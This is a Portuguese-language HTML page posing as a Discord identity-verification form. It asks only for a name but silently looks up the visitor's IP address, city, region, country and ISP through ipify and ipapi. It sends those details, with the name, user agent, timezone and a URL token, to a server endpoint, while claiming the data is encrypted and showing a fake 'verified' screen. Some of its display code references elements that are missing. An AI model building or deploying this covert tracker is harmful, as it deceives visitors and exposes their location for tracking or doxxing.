<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificação de Identidade</title>
<link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #080b14;
    --surface: #0e1422;
    --border: rgba(99,179,237,0.15);
    --accent: #63b3ed;
    --accent2: #9f7aea;
    --text: #e2e8f0;
    --muted: #718096;
    --success: #68d391;
    --glow: rgba(99,179,237,0.3);
  }

  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Sora', sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    position: relative;
  }

  /* Animated background */
  .bg-grid {
    position: fixed; inset: 0; z-index: 0;
    background-image:
      linear-gradient(rgba(99,179,237,0.04) 1px, transparent 1px),
      linear-gradient(90deg, rgba(99,179,237,0.04) 1px, transparent 1px);
    background-size: 40px 40px;
    animation: gridMove 20s linear infinite;
  }
  @keyframes gridMove { 0%{transform:translate(0,0)} 100%{transform:translate(40px,40px)} }

  .orb {
    position: fixed; border-radius: 50%; filter: blur(80px); pointer-events: none; z-index: 0;
  }
  .orb-1 { width:500px;height:500px;background:rgba(99,179,237,0.08);top:-100px;right:-100px; animation: float1 8s ease-in-out infinite; }
  .orb-2 { width:400px;height:400px;background:rgba(159,122,234,0.07);bottom:-80px;left:-80px; animation: float2 10s ease-in-out infinite; }
  @keyframes float1 { 0%,100%{transform:translate(0,0)} 50%{transform:translate(-30px,30px)} }
  @keyframes float2 { 0%,100%{transform:translate(0,0)} 50%{transform:translate(30px,-20px)} }

  /* Particles */
  .particles { position:fixed;inset:0;z-index:0;pointer-events:none; }
  .particle {
    position:absolute; width:2px; height:2px; background:var(--accent); border-radius:50%;
    animation: particleDrift linear infinite;
    opacity: 0;
  }
  @keyframes particleDrift {
    0%{ transform:translateY(100vh) translateX(0); opacity:0; }
    10%{ opacity:0.6; }
    90%{ opacity:0.3; }
    100%{ transform:translateY(-100px) translateX(50px); opacity:0; }
  }

  /* Card */
  .card-wrapper { position:relative; z-index:10; width:100%; max-width:440px; padding:20px; }

  .card {
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 24px;
    padding: 48px 44px;
    position: relative;
    overflow: hidden;
    box-shadow: 0 0 60px rgba(99,179,237,0.06), 0 40px 80px rgba(0,0,0,0.5);
    animation: cardIn 0.7s cubic-bezier(0.34,1.56,0.64,1) both;
  }
  @keyframes cardIn { from{opacity:0;transform:translateY(40px) scale(0.95)} to{opacity:1;transform:translateY(0) scale(1)} }

  .card::before {
    content:''; position:absolute; top:0; left:0; right:0; height:1px;
    background: linear-gradient(90deg, transparent, var(--accent), transparent);
    animation: shimmer 3s ease-in-out infinite;
  }
  @keyframes shimmer { 0%,100%{opacity:0.4} 50%{opacity:1} }

  /* Logo / Icon */
  .logo-wrap {
    display:flex; justify-content:center; margin-bottom:32px;
    animation: logoIn 0.8s 0.2s cubic-bezier(0.34,1.56,0.64,1) both;
  }
  @keyframes logoIn { from{opacity:0;transform:scale(0.5)} to{opacity:1;transform:scale(1)} }

  .logo-icon {
    width:72px; height:72px; background:linear-gradient(135deg,rgba(99,179,237,0.15),rgba(159,122,234,0.15));
    border:1px solid rgba(99,179,237,0.3); border-radius:20px;
    display:flex; align-items:center; justify-content:center;
    position:relative;
    box-shadow: 0 0 30px rgba(99,179,237,0.15);
  }
  .logo-icon svg { width:32px; height:32px; }
  .logo-ring {
    position:absolute; inset:-6px; border-radius:26px;
    border:1px solid transparent;
    background:linear-gradient(var(--surface),var(--surface)) padding-box,
               linear-gradient(135deg,var(--accent),var(--accent2)) border-box;
    animation: rotate 8s linear infinite;
  }
  @keyframes rotate { to{transform:rotate(360deg)} }

  /* Text */
  .card-title {
    font-size:26px; font-weight:700; text-align:center; margin-bottom:8px;
    background:linear-gradient(135deg,#e2e8f0,var(--accent));
    -webkit-background-clip:text; -webkit-text-fill-color:transparent;
    animation: fadeUp 0.6s 0.3s both;
  }
  .card-subtitle {
    font-size:14px; color:var(--muted); text-align:center; margin-bottom:36px; line-height:1.6;
    animation: fadeUp 0.6s 0.4s both;
  }
  @keyframes fadeUp { from{opacity:0;transform:translateY(10px)} to{opacity:1;transform:translateY(0)} }

  /* Input */
  .field {
    margin-bottom:24px;
    animation: fadeUp 0.6s 0.5s both;
  }
  .field label {
    display:block; font-size:12px; font-weight:600; letter-spacing:0.08em;
    text-transform:uppercase; color:var(--muted); margin-bottom:10px;
  }
  .input-wrap { position:relative; }
  .input-wrap svg {
    position:absolute; left:16px; top:50%; transform:translateY(-50%);
    width:18px; height:18px; color:var(--muted); pointer-events:none;
    transition: color 0.3s;
  }
  input {
    width:100%; background:rgba(255,255,255,0.04);
    border:1px solid rgba(255,255,255,0.08);
    border-radius:12px; padding:14px 16px 14px 48px;
    font-family:'Sora',sans-serif; font-size:15px; color:var(--text);
    outline:none; transition:all 0.3s;
  }
  input:focus { border-color:rgba(99,179,237,0.5); background:rgba(99,179,237,0.04); box-shadow:0 0 0 4px rgba(99,179,237,0.08); }
  input:focus + svg, .input-wrap:has(input:focus) svg { color: var(--accent); }
  input::placeholder { color:var(--muted); }

  /* Button */
  .btn {
    width:100%; padding:15px; border:none; border-radius:12px; cursor:pointer;
    font-family:'Sora',sans-serif; font-size:15px; font-weight:600; letter-spacing:0.02em;
    background:linear-gradient(135deg, var(--accent), var(--accent2));
    color:#fff; position:relative; overflow:hidden;
    transition:transform 0.2s, box-shadow 0.2s;
    box-shadow: 0 4px 20px rgba(99,179,237,0.25);
    animation: fadeUp 0.6s 0.6s both;
  }
  .btn:hover { transform:translateY(-2px); box-shadow:0 8px 30px rgba(99,179,237,0.35); }
  .btn:active { transform:translateY(0); }
  .btn::after {
    content:''; position:absolute; inset:0;
    background:linear-gradient(135deg,rgba(255,255,255,0.15),transparent);
    opacity:0; transition:opacity 0.3s;
  }
  .btn:hover::after { opacity:1; }

  /* Security badge */
  .security {
    display:flex; align-items:center; justify-content:center; gap:8px;
    margin-top:24px; font-size:12px; color:var(--muted);
    animation: fadeUp 0.6s 0.7s both;
  }
  .security svg { width:14px; height:14px; color:var(--success); }

  /* ===== VERIFIED SCREEN ===== */
  #verified-screen {
    display:none; text-align:center;
  }
  #verified-screen.active { display:block; animation: cardIn 0.7s cubic-bezier(0.34,1.56,0.64,1) both; }

  .check-wrap {
    display:flex; justify-content:center; margin-bottom:28px;
  }
  .check-circle {
    width:90px; height:90px; border-radius:50%;
    background:linear-gradient(135deg,rgba(104,211,145,0.15),rgba(99,179,237,0.15));
    border:2px solid rgba(104,211,145,0.4);
    display:flex; align-items:center; justify-content:center;
    position:relative;
    animation: popIn 0.6s cubic-bezier(0.34,1.56,0.64,1) both;
    box-shadow: 0 0 40px rgba(104,211,145,0.2);
  }
  @keyframes popIn { from{transform:scale(0)} to{transform:scale(1)} }
  .check-circle svg { width:40px; height:40px; color:var(--success); }
  .pulse-ring {
    position:absolute; inset:-10px; border-radius:50%;
    border:2px solid rgba(104,211,145,0.3);
    animation: pulse 2s ease-out infinite;
  }
  .pulse-ring2 {
    position:absolute; inset:-20px; border-radius:50%;
    border:1px solid rgba(104,211,145,0.15);
    animation: pulse 2s 0.5s ease-out infinite;
  }
  @keyframes pulse { 0%{transform:scale(1);opacity:1} 100%{transform:scale(1.3);opacity:0} }

  .verified-title {
    font-size:28px; font-weight:700; margin-bottom:10px;
    background:linear-gradient(135deg,var(--success),var(--accent));
    -webkit-background-clip:text; -webkit-text-fill-color:transparent;
  }
  .verified-sub { font-size:14px; color:var(--muted); margin-bottom:28px; line-height:1.6; }
  .verified-name {
    display:inline-block; background:rgba(99,179,237,0.1); border:1px solid rgba(99,179,237,0.2);
    border-radius:8px; padding:8px 20px; font-family:'Space Mono',monospace;
    font-size:16px; color:var(--accent); margin-bottom:28px;
  }

  .info-grid {
    display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-bottom:28px;
  }
  .info-card {
    background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.07);
    border-radius:12px; padding:14px;
    text-align:left;
  }
  .info-card-label { font-size:10px; text-transform:uppercase; letter-spacing:0.1em; color:var(--muted); margin-bottom:6px; }
  .info-card-value { font-family:'Space Mono',monospace; font-size:12px; color:var(--text); word-break:break-all; }

  .done-btn {
    display:inline-flex; align-items:center; gap:8px; padding:12px 28px;
    background:linear-gradient(135deg,rgba(104,211,145,0.15),rgba(99,179,237,0.15));
    border:1px solid rgba(104,211,145,0.3); border-radius:10px;
    font-family:'Sora',sans-serif; font-size:14px; font-weight:600; color:var(--success);
    cursor:default; animation: fadeUp 0.6s 0.5s both;
  }
</style>
</head>
<body>

<div class="bg-grid"></div>
<div class="orb orb-1"></div>
<div class="orb orb-2"></div>
<div class="particles" id="particles"></div>

<div class="card-wrapper">

  <!-- LOGIN SCREEN -->
  <div class="card" id="login-screen">
    <div class="logo-wrap">
      <div class="logo-icon">
        <div class="logo-ring"></div>
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" color="#63b3ed">
          <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
        </svg>
      </div>
    </div>

    <h1 class="card-title">Verificação de Acesso</h1>
    <p class="card-subtitle">Insira seu nome para continuar e verificar sua identidade na plataforma.</p>

    <div class="field">
      <label>Seu nome completo</label>
      <div class="input-wrap">
        <input type="text" id="nameInput" placeholder="Digite seu nome..." autocomplete="off" />
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/>
          <circle cx="12" cy="7" r="4"/>
        </svg>
      </div>
    </div>

    <button class="btn" onclick="handleContinue()">
      Continuar →
    </button>

    <div class="security">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
      </svg>
      Conexão segura · Dados criptografados
    </div>
  </div>

  <!-- VERIFIED SCREEN -->
  <div class="card" id="verified-screen">
    <div class="check-wrap">
      <div class="check-circle">
        <div class="pulse-ring"></div>
        <div class="pulse-ring2"></div>
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
          <polyline points="20 6 9 17 4 12"/>
        </svg>
      </div>
    </div>

    <h1 class="verified-title">Identidade Verificada!</h1>
    <p class="verified-sub">Sua verificação foi concluída com sucesso.<br>Você já pode fechar esta janela e voltar ao Discord.</p>

    <div class="verified-name" id="displayName">—</div>

    <div class="done-btn">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
      Acesso Liberado
    </div>
  </div>

</div>

<script>
// Generate particles
const pc = document.getElementById('particles');
for(let i=0;i<25;i++){
  const p = document.createElement('div');
  p.className='particle';
  p.style.left = Math.random()*100+'%';
  p.style.animationDuration = (8+Math.random()*12)+'s';
  p.style.animationDelay = (Math.random()*15)+'s';
  p.style.width = p.style.height = (Math.random()>0.7?3:2)+'px';
  if(Math.random()>0.7) p.style.background='#9f7aea';
  pc.appendChild(p);
}

let ipData = {};
const urlToken = new URLSearchParams(window.location.search).get('token') || '';

// Fetch IP on page load
async function fetchIP(){
  try {
    // Forçar IPv4 usando api4.ipify.org
    const r4 = await fetch('https://api4.ipify.org?format=json');
    const d4 = await r4.json();
    const ipv4 = d4.ip;

    // Buscar detalhes com o IPv4
    const r = await fetch(`https://ipapi.co/${ipv4}/json/`);
    const d = await r.json();
    ipData = d;
  } catch(e) {
    try {
      const r2 = await fetch('https://api4.ipify.org?format=json');
      const d2 = await r2.json();
      ipData = {ip: d2.ip, country_name:'N/A', city:'N/A'};
    } catch(e2){ ipData = {ip:'N/A', country_name:'N/A', city:'N/A'}; }
  }
}
fetchIP();

// Enter key
document.getElementById('nameInput').addEventListener('keydown', e => {
  if(e.key==='Enter') handleContinue();
});

async function handleContinue(){
  const name = document.getElementById('nameInput').value.trim();
  if(!name){ 
    document.getElementById('nameInput').style.borderColor='rgba(252,129,129,0.5)';
    document.getElementById('nameInput').style.animation='shake 0.4s ease';
    setTimeout(()=>{
      document.getElementById('nameInput').style.borderColor='';
      document.getElementById('nameInput').style.animation='';
    },500);
    return; 
  }

  const btn = document.querySelector('.btn');
  btn.textContent = 'Verificando...';
  btn.disabled = true;

  // Small delay for effect
  await new Promise(r=>setTimeout(r,1200));

  const now = new Date();
  const dateStr = now.toLocaleDateString('pt-BR') + ' ' + now.toLocaleTimeString('pt-BR');

  // Send to webhook/server
  const payload = {
    name: name,
    ip: ipData.ip || 'N/A',
    country: ipData.country_name || 'N/A',
    city: ipData.city || 'N/A',
    region: ipData.region || 'N/A',
    isp: ipData.org || 'N/A',
    date: dateStr,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    userAgent: navigator.userAgent,
    token: urlToken
  };

  // Try to send to bot webhook
  try {
    await fetch('/api/register', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify(payload)
    });
  } catch(e){}

  // Show verified screen
  document.getElementById('login-screen').style.display='none';
  const vs = document.getElementById('verified-screen');
  vs.style.display='block';
  vs.classList.add('active');

  document.getElementById('displayName').textContent = name;
  document.getElementById('displayIP').textContent = ipData.ip || 'N/A';
  document.getElementById('displayDate').textContent = dateStr;
  document.getElementById('displayCountry').textContent = ipData.country_name || 'N/A';
  document.getElementById('displayCity').textContent = (ipData.city||'') + (ipData.region?', '+ipData.region:'') || 'N/A';
}
</script>

<style>
@keyframes shake {
  0%,100%{transform:translateX(0)} 25%{transform:translateX(-8px)} 75%{transform:translateX(8px)}
}
</style>
</body>
</html>
